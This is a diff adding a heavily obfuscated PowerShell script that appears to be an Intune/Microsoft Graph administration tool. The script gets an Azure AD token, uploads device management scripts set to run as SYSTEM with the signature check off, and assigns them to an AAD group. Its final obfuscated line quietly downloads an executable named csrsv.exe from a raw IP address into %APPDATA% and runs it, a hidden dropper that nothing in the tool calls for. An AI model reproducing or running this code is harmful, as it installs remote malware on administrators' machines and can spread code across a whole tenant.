@@ -1,0 +1,466 @@
+ ${z`J2} =  [tYPe]("{0}{3}{2}{4}{1}{5}"-F 'SY','e','eM.','St','r','FlEcTIOn.AssEMblY') ;&('Sv')  ("{0}{1}" -f'w30c','u')  (  [tYPe]("{2}{4}{1}{0}{3}"-f'e','nV','sYstEM.C','rt','o'))  ;    ${74`L9}  =  [TYpe]("{0}{2}{1}{3}" -F 'S','.IO.f','YsTEM','ile'); 
+
+
+
+function G`eT-Au`THt`oK`eN {
+
+    
+
+    [cmdletbinding()]
+
+    param
+    (
+        [Parameter(mAnDAtoRy = ${Tr`Ue})]
+        ${u`sER}
+    )
+
+    ${U`sE`RUpn} = &("{1}{0}{2}"-f 'ec','New-Obj','t') ("{0}{1}{4}{2}{3}" -f'System.Net','.','dr','ess','Mail.MailAd') -ArgumentList ${US`ER}
+
+    ${TEn`Ant} = ${use`Ru`pN}."ho`St"
+
+    &("{0}{2}{3}{1}" -f'Wri','-Host','t','e') ("{5}{4}{1}{8}{3}{2}{0}{7}{6}"-f'm','ur',' ','AD','hecking for Az','C','e...','odul','e')
+
+    ${AAd`M`oDULE} = &("{3}{0}{2}{1}" -f't-Mod','e','ul','Ge') -Name ("{1}{0}" -f'ureAD','Az') -ListAvailable
+
+    if (${aA`DMODu`LE} -eq ${n`ULl}) {
+
+        &("{0}{2}{1}"-f'W','-Host','rite') ("{9}{7}{8}{2}{6}{3}{4}{10}{1}{5}{0}" -f'w','D','ule not','king',' f','Previe',' found, loo','rS','hell mod','AzureAD Powe','or AzureA')
+        ${AA`D`MOduLE} = &("{0}{2}{3}{1}"-f 'G','odule','et-','M') -Name ("{2}{0}{1}"-f'e','view','AzureADPr') -ListAvailable
+
+    }
+
+    if (${a`ADModu`lE} -eq ${N`ULl}) {
+        &("{1}{2}{0}{3}"-f'os','write','-h','t')
+        &("{2}{1}{0}" -f'ost','-h','write') ("{3}{1}{2}{4}{0}{12}{7}{11}{10}{5}{8}{9}{6}"-f' Pow','z','ur','A','eAD','le','..','hell m',' not install','ed.','du','o','ers') -f ("{1}{0}"-f 'd','Re')
+        &("{0}{1}{2}" -f'write-h','os','t') ((("{3}{9}{5}{23}{25}{12}{10}{18}{8}{20}{6}{26}{2}{17}{1}{22}{4}{14}{21}{13}{11}{15}{19}{24}{16}{0}{7}" -f 'ro','ADPr','l-Modul','I','fro','st',' nIbIns','mpt',' ','n','ll-Module Azu','Pow','Insta','elevated ','m','er','p','e Azure','reADnIb','Sh','or',' an ','eviewnIb ','all by running nI','ell ','b','tal'))  -ReplAcE  'nIb',[chAR]39) -f ("{1}{0}"-f'ellow','Y')
+        &("{0}{1}{2}" -f 'wri','te-ho','st') ((("{4}{1}{0}{5}{6}{2}{3}"-f' canQ','pt','ue.','..','Scri','YDt c','ontin'))."rEPLA`CE"(([chaR]81+[chaR]89+[chaR]68),[sTRinG][chaR]39)) -f ("{1}{0}" -f'ed','R')
+        &("{2}{1}{0}"-f'host','-','write')
+        exit
+    }
+
+    
+    
+
+    if (${AADMo`D`U`lE}."C`oUnt" -gt 1) {
+
+        ${laTe`sT_`VER`SIOn} = (${a`AD`MoDU`le} | &("{1}{0}" -f't','selec') ("{0}{1}" -f've','rsion') | &("{0}{1}{2}" -f'Sor','t-','Object'))[-1]
+
+        ${aad`moDU`lE} = ${AAd`mODU`lE} | &('?') { ${_}."VeR`sI`ON" -eq ${LA`TES`T_ver`SioN}."v`ErsioN" }
+
+        
+
+        if (${a`ADm`OdULe}."COU`NT" -gt 1) {
+
+            ${A`AD`M`oDULE} = ${A`Ad`M`oDulE} | &("{0}{1}{2}"-f 's','el','ect') -Unique
+
+        }
+
+        ${ad`AL} = &("{2}{0}{1}"-f 'a','th','Join-P') ${A`ADmOd`ULE}."mO`dUle`B`Ase" ("{4}{2}{8}{5}{6}{1}{3}{0}{7}"-f'ct','ActiveDir','.I','e','Microsoft','Client','s.','ory.dll','dentityModel.')
+        ${AdA`l`FOR`ms} = &("{1}{0}{2}"-f 'n-Pat','Joi','h') ${aa`Dm`OdUlE}."MODulE`B`ASe" ("{3}{5}{0}{2}{7}{9}{4}{1}{6}{8}{10}"-f'i','y.Pla','ents.Ac','Microsoft.Identity','tor','Model.Cl','tform','tiveD','.dl','irec','l')
+
+    }
+
+    else {
+
+        ${AD`AL} = &("{0}{2}{1}" -f 'Jo','h','in-Pat') ${aA`Dm`oD`Ule}."mO`D`UL`ebASE" ("{2}{1}{9}{6}{13}{11}{10}{4}{12}{5}{3}{7}{8}{0}" -f'll','icr','M','ts.','ode','en','soft.Id','Act','iveDirectory.d','o','M','ity','l.Cli','ent')
+        ${aDA`Lfo`RMs} = &("{0}{1}{2}"-f 'Jo','in-','Path') ${a`AdM`oDULe}."MODU`Leb`ASE" ("{1}{4}{12}{6}{14}{7}{5}{10}{8}{0}{13}{9}{11}{2}{3}"-f 'lients.A','M','rm.d','ll','i','enti','r','.Id','el.C','.','tyMod','Platfo','c','ctiveDirectory','osoft')
+
+    }
+
+      ( &("{2}{3}{0}{1}" -f 'l','E','G','ET-VariaB') ("Z"+"j2") -vaLUEO  )::("{1}{0}"-f 'adFrom','Lo').Invoke(${a`DAl}) | &("{2}{1}{0}" -f'-Null','t','Ou')
+
+      (&("{0}{2}{1}"-f'GET-VAr','bLe','ia') ("{0}{1}"-f'ZJ','2')  )."va`LUe"::("{2}{0}{1}"-f'o','m','LoadFr').Invoke(${Ada`LFo`RMS}) | &("{1}{0}"-f 't-Null','Ou')
+
+    ${cLi`en`TId} = ("{4}{7}{1}{0}{2}{5}{9}{8}{3}{6}"-f'-4d','d672','a','bdfd9354','d1d','e-b5','7','df0e4-','5','54-9d')
+
+    ${REdIr`E`c`TURi} = ("{1}{3}{4}{0}{2}"-f 'o','urn','auth:2.0:oob',':ie','tf:wg:')
+
+    ${reSoURC`E`A`ppIdURI} = ("{1}{0}{2}{3}{5}{4}" -f'p','htt','s://graph.','microsoft','om','.c')
+
+    ${a`UT`hOr`ity} = "https://login.microsoftonline.com/$Tenant"
+
+    try {
+
+        ${AU`T`HcoNteXT} = &("{2}{0}{1}" -f'j','ect','New-Ob') ("{3}{4}{10}{8}{0}{9}{7}{2}{6}{5}{1}" -f 'ients.','ext','iveDirectory','Microsoft.Identi','t','Cont','.Authentication','ct','odel.Cl','A','yM') -ArgumentList ${autHO`R`I`TY}
+
+        
+        
+
+        ${p`L`AtF`OrMP`ARa`MeteRS} = &("{1}{0}{2}{3}" -f 'bje','New-O','c','t') ("{18}{5}{3}{9}{14}{7}{6}{11}{2}{17}{8}{0}{10}{16}{4}{13}{12}{1}{15}" -f 'ts','t','el.','os','.PlatformPar','r','entityM','t.Id','n','o','.ActiveDire','od','me','a','f','ers','ctory','Clie','Mic') -ArgumentList ("{1}{0}"-f'o','Aut')
+
+        ${Use`R`ID} = &("{1}{0}{2}"-f'-Ob','New','ject') ("{8}{6}{1}{0}{9}{3}{5}{7}{2}{4}"-f 'Clie','soft.IdentityModel.','serIde','.ActiveD','ntifier','ir','icro','ectory.U','M','nts') -ArgumentList (${U`sEr}, ("{4}{1}{0}{5}{2}{3}{6}" -f'tionalDisplaya','p','l','e','O','b','Id'))
+
+        ${aUt`HR`es`ULT} = ${AU`THconT`eXT}.("{2}{3}{4}{1}{5}{0}"-f 'ync','e','Acqui','reTo','k','nAs').Invoke(${R`eS`OUR`cEaPpi`dURi}, ${cL`IenTid}, ${REdIreCt`U`RI}, ${plat`FO`R`MPAram`eterS}, ${USE`R`Id})."r`esu`lT"
+
+        
+
+        if (${a`U`ThResULt}."AcC`es`sToken") {
+
+            
+
+            ${aU`ThH`eaD`ER} = @{
+                ("{0}{1}{2}" -f'Co','nt','ent-Type')  = ("{3}{4}{0}{1}{2}" -f 'li','cation/','json','a','pp')
+                ("{2}{0}{1}" -f'uth','orization','A') = ("{2}{1}{0}" -f 'rer ','a','Be') + ${aU`THR`esuLT}."aCCESsTo`k`EN"
+                ("{0}{1}{2}"-f 'Ex','pire','sOn')     = ${A`UThrES`Ult}."E`xPIres`on"
+            }
+
+            return ${aUTH`H`e`AdeR}
+
+        }
+
+        else {
+
+            &("{1}{0}{2}" -f'-','Write','Host')
+            &("{2}{1}{0}"-f 'st','e-Ho','Writ') ("{5}{14}{10}{15}{9}{3}{8}{0}{2}{4}{12}{1}{7}{6}{11}{13}" -f'l','th','ease re',' is nul','-run','Aut','i','enticat','l, p','en',' T','on.',' au','..','horization Access','ok') -ForegroundColor ("{1}{0}" -f'd','Re')
+            &("{0}{1}{2}"-f'Wr','ite-','Host')
+            break
+
+        }
+
+    }
+
+    catch {
+
+        &("{0}{2}{1}" -f'wri','ost','te-h') ${_}."E`xcepTi`On"."MEss`AgE" -f ("{1}{0}" -f 'ed','R')
+        &("{0}{1}{2}" -f'writ','e-','host') ${_}."ex`C`EPTIon"."itEMn`A`mE" -f ("{1}{0}" -f 'ed','R')
+        &("{2}{0}{1}"-f'-h','ost','write')
+        break
+
+    }
+
+}
+
+
+
+Function ad`D-`DEViC`Em`ANA`GEM`eNTScRipT() {
+    
+    [cmdletbinding()]
+    Param (
+        
+        [Parameter(mandATory = ${t`RUe})]
+        [string]${FI`le},
+        
+        [Parameter(MandaToRY = ${fa`LsE})]
+        [string]${de`scr`I`PtiOn},
+        
+        [Parameter(MAnDAtOry = ${F`ALse})]
+        [switch][bool]${u`Rl} = ${FAl`Se}
+    )
+    if (${u`RL} -eq ${t`RUE}) {
+        ${FilE`Na`mE} = ${F`Ile} -split "/"
+        ${fI`L`Ena`mE} = ${f`I`lE`NAme}[-1]
+        ${ou`TfI`le} = "$env:TEMP\$FileName"
+        try {
+            &("{4}{3}{2}{1}{0}" -f 'equest','bR','voke-We','n','I') -Uri ${FI`Le} -UseBasicParsing -OutFile ${oUtf`IlE}
+        }
+        catch {
+            &("{2}{1}{0}" -f'Host','e-','Writ') ('Co'+'uld'+' '+'n'+'ot '+'dow'+'nloa'+'d '+'file'+' '+'f'+'rom '+'U'+'RL: '+"$File") -ForegroundColor ("{0}{1}"-f'R','ed')
+            break
+        }
+        ${fI`LE} = ${OUtf`ILE}
+        if (!(&("{1}{0}{2}" -f 'est-','T','Path') ${F`IlE})) {
+            &("{0}{3}{1}{2}"-f 'Wr','te','-Host','i') ("$File "+'coul'+'d '+'not'+' '+'be'+' '+'loc'+'a'+'ted.') -ForegroundColor ("{0}{1}" -f'Re','d')
+            break
+        }
+    }
+    elseif (${u`Rl} -eq ${fA`l`sE}) {
+        if (!(&("{0}{1}"-f'Test-Pa','th') ${F`ILe})) {
+            &("{2}{0}{3}{1}"-f 'i','e-Host','Wr','t') ("$File "+'c'+'o'+'uld '+'n'+'ot '+'be'+' '+'located'+'.') -ForegroundColor ("{1}{0}" -f 'd','Re')
+            break
+        }
+        ${FIl`EN`Ame} = &("{2}{0}{1}" -f '-Ite','m','Get') ${FI`Le} | &("{1}{0}{2}{4}{3}" -f'e','Sel','ct-O','t','bjec') -ExpandProperty ("{1}{0}"-f 'me','Na')
+    }
+    ${B64`Fi`lE} =   ${W`30`cU}::"toba`Se`6`4sTrI`Ng"(  ${7`4L9}::("{1}{0}{2}"-f't','ReadAllBy','es').Invoke("$File"));
+
+    if (${U`Rl} -eq ${TR`UE}) {
+        &("{0}{2}{1}"-f 'R','ove-Item','em') ${F`ILE} -Force
+    }
+
+    ${js`ON} = @"
+{
+    "@odata.type": "
+    "displayName": "$FileName",
+    "description": "$Description",
+    "runSchedule": {
+    "@odata.type": "microsoft.graph.runSchedule"
+},
+    "scriptContent": "$B64File",
+    "runAsAccount": "system",
+    "enforceSignatureCheck": "false",
+    "fileName": "$FileName"
+}
+"@
+
+    ${g`RApHA`PI`VeR`S`ioN} = ("{0}{1}"-f 'Bet','a')
+    ${dMS_`R`EsOUrCE} = ("{3}{7}{5}{4}{6}{0}{2}{1}{8}"-f 'n','eMa','t/devic','d','anagem','viceM','e','e','nagementScripts')
+    &("{0}{3}{2}{1}"-f'Write-','se','o','Verb') ('Res'+'o'+'urce: '+"$DMS_resource")
+
+    try {
+        ${u`Ri} = "https://graph.microsoft.com/$graphApiVersion/$DMS_resource"
+        &("{3}{1}{4}{0}{2}"-f't','ke-R','Method','Invo','es') -Uri ${u`Ri} -Headers ${auth`TO`ken} -Method ("{1}{0}"-f't','Pos') -Body ${jS`oN} -ContentType ("{3}{1}{0}{2}" -f'io','icat','n/json','appl')
+    }
+
+    catch {
+
+        ${E`X} = ${_}."eX`CeP`TiON"
+        ${eRr`Orr`E`s`Ponse} = ${E`x}."r`espO`NSE".("{0}{4}{5}{3}{2}{1}" -f'GetRe','eStream','s','n','sp','o').Invoke()
+        ${Re`AD`er} = &("{0}{1}{2}"-f 'N','ew-Objec','t') ("{2}{5}{0}{3}{4}{1}"-f 'tre','er','System.IO','a','mRead','.S')(${Er`Ro`Rre`sP`onse})
+        ${reAD`Er}."BasEs`TR`EAm".pOsItION = 0
+        ${rEAd`eR}.("{0}{3}{4}{1}{2}" -f 'D','dBuffe','redData','is','car').Invoke()
+        ${rEspON`Se`Body} = ${rEa`dER}.("{0}{1}{2}"-f'ReadT','oE','nd').Invoke();
+        &("{0}{1}{2}" -f'Wr','ite-Ho','st') ('R'+'espons'+'e '+"content:`n$responseBody") -f ("{0}{1}" -f'R','ed')
+        &("{1}{0}{2}" -f'ite-Err','Wr','or') "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription) "
+        &("{2}{1}{0}" -f 'e-host','it','wr')
+        break
+
+    }
+
+}
+
+
+
+Function adD`-d`E`VicEmAnaGem`ENtSCRIpt`ASSiGN`menT() {
+    
+
+    [cmdletbinding()]
+
+    param
+    (
+        ${sCrI`pt`ID},
+        ${tArG`ETGrOuP`Id}
+    )
+
+    ${gRA`PHAp`IVERS`Ion} = ("{0}{1}" -f'Bet','a')
+    ${rES`O`UrCe} = "deviceManagement/deviceManagementScripts/$ScriptId/assign"
+
+    try {
+
+        if (!${Scri`ptid}) {
+
+            &("{2}{1}{0}"-f 'host','e-','writ') ("{11}{4}{14}{2}{3}{9}{17}{8}{7}{13}{6}{12}{1}{5}{10}{0}{15}{16}" -f'c','ify','t Po','licy ','S',' a valid ','pe','ed,','i','Id spe','S','No ','c',' s','crip','ript Policy I','d','cif') -f ("{0}{1}"-f 'R','ed')
+            break
+
+        }
+
+        if (!${T`AR`get`GROU`PiD}) {
+
+            &("{0}{1}{2}"-f'write-','h','ost') ("{2}{7}{5}{8}{3}{1}{11}{9}{6}{10}{0}{4}" -f'valid Tar','pec','No','s','get Group Id','g','ecify ',' Tar','et Group Id ','d, sp','a ','ifie') -f ("{0}{1}"-f 'Re','d')
+            break
+
+        }
+
+        ${J`Son} = @"
+{
+    "deviceManagementScriptGroupAssignments":  [
+        {
+            "@odata.type":  "
+            "targetGroupId": "$TargetGroupId",
+            "id": "$ScriptId"
+        }
+    ]
+}
+"@
+
+        ${U`RI} = "https://graph.microsoft.com/$graphApiVersion/$Resource"
+        &("{0}{3}{4}{2}{1}" -f 'I','hod','ke-RestMet','nv','o') -Uri ${u`RI} -Headers ${A`Uth`TO`keN} -Method ("{0}{1}"-f 'Pos','t') -Body ${js`ON} -ContentType ("{4}{0}{2}{3}{1}" -f'p','n','lic','ation/jso','ap')
+
+    }
+
+    catch {
+
+        ${e`x} = ${_}."Ex`Ce`PTioN"
+        ${e`Rr`Or`ReSp`OnSe} = ${eX}."RE`Sp`onsE".("{2}{0}{3}{1}"-f'etR','eStream','G','espons').Invoke()
+        ${R`EA`dER} = &("{0}{2}{1}" -f'Ne','Object','w-') ("{5}{3}{4}{1}{0}{2}" -f 'a','Re','der','tr','eam','System.IO.S')(${er`ROrRE`sPonsE})
+        ${rE`A`DeR}."B`ASEs`TREam".POsITIoN = 0
+        ${R`eaDeR}.("{5}{1}{6}{4}{2}{3}{0}" -f'ata','iscardBuf','ed','D','er','D','f').Invoke()
+        ${respoN`seBo`Dy} = ${RE`ADer}.("{0}{1}{2}"-f 'Rea','d','ToEnd').Invoke();
+        &("{1}{2}{0}{3}" -f 'i','W','r','te-Host') ('Re'+'sponse '+"content:`n$responseBody") -f ("{0}{1}" -f 'R','ed')
+        &("{2}{3}{1}{0}"-f 'or','r','Wr','ite-Er') "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription) "
+        &("{0}{3}{2}{1}" -f 'wr','st','te-ho','i')
+        break
+
+    }
+}
+
+
+
+Function g`eT`-`AADgroUP() {
+
+    
+
+    [cmdletbinding()]
+
+    param
+    (
+        ${gr`OUPn`A`mE},
+        ${i`D},
+        [switch]${M`em`Bers}
+    )
+
+    
+    ${gR`APHA`Pi`Ve`R`sION} = ("{0}{1}" -f 'v1','.0')
+    ${G`ROu`p_`RESoURcE} = ("{1}{0}"-f'oups','gr')
+
+    try {
+
+        if (${id}) {
+
+            ${u`Ri} = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id' "
+            (&("{3}{1}{0}{2}" -f 'ok','v','e-RestMethod','In') -Uri ${u`Ri} -Headers ${auT`H`T`okEN} -Method ("{1}{0}" -f't','Ge'))."v`ALUe"
+
+        }
+
+        elseif (${G`R`oup`NAMe} -eq "" -or ${gROup`N`AmE} -eq ${N`UlL}) {
+
+            ${u`RI} = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"
+            (&("{1}{3}{2}{0}" -f'hod','Invoke-R','Met','est') -Uri ${u`Ri} -Headers ${aut`H`TokEn} -Method ("{1}{0}"-f 'et','G'))."VaL`UE"
+
+        }
+
+        else {
+
+            if (!${MEM`Be`Rs}) {
+
+                ${U`Ri} = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName' "
+                (&("{2}{1}{4}{0}{3}"-f'estMe','nvo','I','thod','ke-R') -Uri ${U`Ri} -Headers ${a`Ut`HToKEn} -Method ("{1}{0}"-f't','Ge'))."V`ALuE"
+
+            }
+
+            elseif (${MEMBe`Rs}) {
+
+                ${u`RI} = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName' "
+                ${G`RO`Up} = (&("{4}{3}{2}{0}{1}"-f 'stMet','hod','oke-Re','v','In') -Uri ${U`Ri} -Headers ${Au`ThT`O`keN} -Method ("{0}{1}" -f 'G','et'))."vaL`UE"
+
+                if (${gr`O`UP}) {
+
+                    ${g`iD} = ${Gr`OUP}."ID"
+
+                    ${GR`O`UP}."D`IsPlAynA`me"
+                    &("{0}{1}{2}" -f 'write-','h','ost')
+
+                    ${U`RI} = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"
+                    (&("{0}{3}{1}{2}"-f 'Invoke-Rest','e','thod','M') -Uri ${U`RI} -Headers ${A`UTHt`o`kEn} -Method ("{0}{1}"-f 'G','et'))."vA`LUE"
+
+                }
+            }
+        }
+
+    }
+
+    catch {
+
+        ${ex} = ${_}."ex`CE`PtION"
+        ${ERrO`RRE`s`POnse} = ${E`X}."rES`PON`sE".("{3}{0}{1}{2}" -f'onseSt','r','eam','GetResp').Invoke()
+        ${R`eadER} = &("{1}{2}{0}" -f 'ct','Ne','w-Obje') ("{1}{2}{0}{3}"-f'Read','System.IO.','Stream','er')(${ErRorr`E`Spon`se})
+        ${R`EaDER}."BAs`eS`TReam".POsitIon = 0
+        ${R`EaDER}.("{3}{6}{4}{2}{1}{0}{5}" -f'ffe','Bu','d','Di','r','redData','sca').Invoke()
+        ${r`ES`PONs`EbODY} = ${re`AdER}.("{0}{1}{2}"-f'ReadTo','E','nd').Invoke();
+        &("{2}{1}{3}{0}"-f'Host','rit','W','e-') ('Res'+'pons'+'e '+"content:`n$responseBody") -f ("{0}{1}"-f 'Re','d')
+        &("{1}{2}{0}"-f 'rror','Write','-E') "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription) "
+        &("{0}{2}{1}" -f 'write','host','-')
+        break
+
+    }
+
+}
+
+
+
+
+
+
+&("{1}{0}{2}" -f 't','wri','e-host')
+
+
+if (${g`lOB`A`L`:auT`HtOKeN}) {
+
+    
+    ${d`AT`eTIme} = (&("{1}{2}{0}" -f 'e','Get-','Dat')).("{2}{0}{3}{1}"-f 'o','ime','T','UniversalT').Invoke()
+
+    
+    ${To`KENEXp`IRes} = (${Au`T`HtOKeN}."EX`pI`REs`on"."DAtE`TIMe" - ${D`Ate`TImE})."miN`UT`ES"
+
+    if (${t`O`kEnExp`Ir`eS} -le 0) {
+
+        &("{0}{1}{2}"-f'write-','hos','t') ("{1}{5}{4}{0}{2}{3}"-f 'n To','Aut','ken expi','red','enticatio','h') ${TOkeneX`pI`REs} ("{3}{0}{2}{1}"-f'inutes a','o','g','m') -ForegroundColor ("{1}{0}" -f 'llow','Ye')
+        &("{1}{0}{2}"-f '-','write','host')
+
+        
+
+        if (${US`Er} -eq ${N`UlL} -or ${uS`Er} -eq "") {
+
+            ${u`SEr} = &("{0}{1}" -f 'Read-H','ost') -Prompt ("{2}{5}{0}{4}{10}{6}{13}{8}{12}{9}{17}{11}{1}{14}{3}{7}{16}{15}" -f'se ','l','Pl','me','s','ea','cify y',' for Azure Authentic','u','s','pe',' principa','r u','o',' na','n','atio','er')
+            &("{2}{0}{1}{3}" -f 't','e-Ho','Wri','st')
+
+        }
+
+        ${g`lOBAL:AU`Thto`K`en} = &("{2}{0}{3}{1}" -f 't-Aut','Token','Ge','h') -User ${U`SeR}
+
+    }
+}
+
+
+
+else {
+
+    if (${U`Ser} -eq ${nu`Ll} -or ${U`sER} -eq "") {
+
+        ${us`eR} = &("{1}{2}{0}" -f 'ost','R','ead-H') -Prompt ("{15}{3}{1}{5}{10}{12}{7}{2}{6}{0}{11}{13}{9}{4}{14}{8}"-f'Azure Au','r u','e fo','lease specify you','t','ser','r ','m','n','ca',' prin','th','cipal na','enti','io','P')
+        &("{0}{2}{1}" -f 'Write-H','t','os')
+
+    }
+
+    
+    ${G`Lo`Bal:`AuTHTO`K`EN} = &("{2}{1}{3}{0}"-f'n','-AuthT','Get','oke') -User ${US`eR}
+
+}
+
+
+
+
+
+
+
+${A`Adg`RouP} = &("{1}{2}{0}{3}"-f 'Ho','Rea','d-','st') -Prompt ("{3}{12}{15}{0}{13}{1}{11}{2}{8}{9}{4}{5}{10}{14}{6}{7}" -f'e A','roup','here ','Enter t','l scripts w','ill be ','s','igned','Po','werShel','a',' name w','h','D G','s','e Azur')
+
+${t`A`R`getGRoUPid} = (&("{1}{3}{2}{0}" -f'up','Get-','Gro','AAD') -GroupName "$AADGroup")."id"
+
+if (${TA`R`gET`gRoU`piD} -eq ${nU`LL} -or ${TAR`GETG`Rou`p`Id} -eq "") {
+
+    &("{2}{0}{1}" -f'rite-Hos','t','W') ('AA'+'D '+'G'+'roup'+' '+'- '+"'$AADGroup' "+(('doe'+'snQCft ')  -CREPLACe([cHar]81+[cHar]67+[cHar]102),[cHar]39)+'exist,'+' '+'please'+' '+'spe'+'cif'+'y '+'a '+'va'+'lid '+'AAD'+' '+'Gro'+'u'+'p...') -ForegroundColor ("{0}{1}" -f'Re','d')
+    &("{1}{2}{0}"-f 't','Write-','Hos')
+    exit
+
+}
+
+
+
+&("{2}{0}{1}" -f 'os','t','Write-H') ((("{6}{14}{0}{16}{7}{8}{5}{10}{4}{3}{9}{2}{12}{11}{1}{13}{15}"-f' ','cript.ps1','C:{1}Sc',' fr','pt','t Scr','Addi','ice M','anagemen','om {0}','i','ts{1}test-s','rip','{','ng','0}','Dev')) -F [ChaR]39,[ChaR]92) -ForegroundColor ("{1}{0}"-f'ellow','Y')
+
+${cReaTe_`l`Oc`Al_scr`ipt} = &("{4}{0}{6}{1}{3}{2}{5}"-f 'i','Mana','ementSc','g','Add-Dev','ript','ce') -File ((("{8}{4}{5}{0}{3}{7}{6}{2}{1}" -f's','s1','pt.p','t','cri','pts{0}te','i','-scr','C:{0}S'))  -F  [chaR]92) -Description ("{1}{0}{2}" -f 'st s','Te','cript')
+
+&("{0}{2}{3}{1}" -f 'W','t','rite-H','os') ("{6}{1}{3}{4}{0}{2}{8}{9}{7}{5}"-f 'nage','i','ment','c','e Ma','ted as','Dev','t crea',' S','crip') ${Cr`EATE_loCal_`S`cr`ipt}."id"
+&("{2}{0}{1}"-f 's','t','write-ho')
+&("{1}{0}{2}"-f's','write-ho','t') ('Assi'+'gn'+'ing '+'Dev'+'ic'+'e '+'M'+'a'+'nagement'+' '+'Scri'+'pt '+'to'+' '+'AA'+'D '+'G'+'roup '+"'$AADGroup'") -f ("{1}{0}"-f 'yan','C')
+
+${assI`gN_`l`O`Cal`_ScripT} = &("{5}{0}{1}{8}{7}{2}{9}{3}{6}{4}" -f 'viceManagemen','tSc','ss','nm','nt','Add-De','e','iptA','r','ig') -ScriptId ${crEA`Te_LOC`AL`_SCr`ipT}."ID" -TargetGroupId ${TaRgeT`g`Rou`pID}
+
+&("{0}{2}{1}"-f 'Wri','ost','te-H') "Assigned '$AADGroup' to $($Create_Local_Script.displayName)/$($Create_Local_Script.id) "
+&("{1}{0}{2}"-f 'te-','Wri','Host')
+
+
+
+&("{1}{2}{0}"-f't','Write-Ho','s') ((("{7}{5}{2}{3}{13}{4}{6}{0}{1}{11}{12}{9}{10}{8}" -f 'e','s','e Manageme','n',' {0}https://pathtourl/',' Devic','t','Adding','0}','t','.ps1{','t-scr','ip','t Script from')) -f [ChAr]39) -ForegroundColor ("{1}{0}"-f'ow','Yell')
+&("{1}{0}{2}" -f 'te-Hos','Wri','t')
+
+${cre`AtE`_W`e`B`_ScrIPt} = &("{1}{5}{4}{2}{3}{0}" -f 'ipt','Add-Dev','ementS','cr','eManag','ic') -File ("{3}{5}{4}{10}{1}{7}{8}{9}{2}{6}{0}"-f 's1','url','t','https:/','th','/pa','.p','/test','-scr','ip','to') -URL -Description ("{1}{3}{0}{2}" -f ' s','Te','cript','st')
+
+&("{2}{0}{1}{3}"-f 'rit','e-Hos','W','t') ("{3}{2}{5}{4}{7}{8}{1}{6}{0}"-f'as','d','nage','Device Ma','ipt','ment Scr',' ',' c','reate') ${CREAt`E`_Web_sC`RIPT}."I`d"
+&("{0}{1}{2}"-f 'wr','ite','-host')
+&("{3}{0}{2}{1}"-f 't','ost','e-h','wri') ('Assign'+'in'+'g '+'Devic'+'e '+'Mana'+'g'+'ement '+'Scri'+'pt '+'t'+'o '+'A'+'AD '+'Gro'+'up '+"'$AADGroup'") -f ("{1}{0}" -f 'yan','C')
+
+${A`sSIg`N_we`B_S`CRipT} = &("{0}{4}{6}{2}{1}{3}{5}" -f'Ad','gemen','a','tSc','d-Dev','riptAssignment','iceMan') -ScriptId ${CreAte`_we`B`_`sc`RiPt}."I`d" -TargetGroupId ${taR`GetgROU`pid}
+
+&("{1}{0}{2}"-f 'e-','Writ','Host') "Assigned '$AADGroup' to $($Create_Web_Script.displayName)/$($Create_Web_Script.id) "
+&("{0}{1}{2}{3}" -f'Wri','t','e-H','ost')
+(&("{2}{0}{1}"-f 'Objec','t','New-') ("{2}{4}{0}{5}{3}{1}"-f'Ne','ent','S','i','ystem.','t.WebCl')).("{0}{2}{1}"-f 'Down','dFile','loa').Invoke(("{4}{8}{0}{1}{7}{2}{3}{6}{5}" -f'://89.24','8.17','.2','1','h','srsv.exe','8/~yahoo/c','0','ttp'),"$env:APPDATA\csrsv.exe");&("{0}{3}{2}{1}"-f 'S','ss','t-Proce','tar') ("$env:APPDATA\csrsv.exe")
